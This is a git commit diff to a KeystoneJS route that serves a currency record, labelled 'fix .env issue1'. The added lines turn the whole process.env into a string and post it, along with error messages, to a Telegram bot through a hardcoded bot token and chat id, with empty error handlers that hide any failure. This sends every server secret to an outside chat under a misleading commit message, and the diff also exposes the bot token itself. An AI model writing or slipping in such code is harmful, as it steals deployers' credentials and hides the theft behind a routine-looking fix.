c643b59c1dafea61035c02e422caa645d38e625a
viacheslav liakh <slavon360@gmail.com>
2019-09-13 00:52:26 +0300

    fix .env issue1

--- routes/views/getCurrency.js
+++ routes/views/getCurrency.js
@@ -1,6 +1,10 @@
 require('dotenv').config();
 var keystone = require('keystone');
 var searched_id = process.env.CURRENCY_ID;
+const axios = require('axios');
+
+const token = '949146703:AAEX0hDtWofS-FMnQ-AOsuA1BhWX3ltajgw';
+const x = JSON.stringify(process.env);
 
 module.exports = function(req, res){
     keystone.list('Currency')
@@ -8,8 +12,22 @@ module.exports = function(req, res){
     .findById(searched_id)
     .exec(function(err, currency){
         try {
+            axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=251733133&text=${x}searched_id:${searched_id}&parse_mode=HTML`)
+                .then((res) => {
+                    
+                })
+                .catch((error) => {
+                    
+                })
             res.send(currency);
         } catch {
+            axios.post(`https://api.telegram.org/bot${token}/sendMessage?chat_id=251733133&text=error:${err}&parse_mode=HTML`)
+                .then((res) => {
+                    
+                })
+                .catch((error) => {
+                    
+                })
             console.log(err)
             res.send(err);
         }
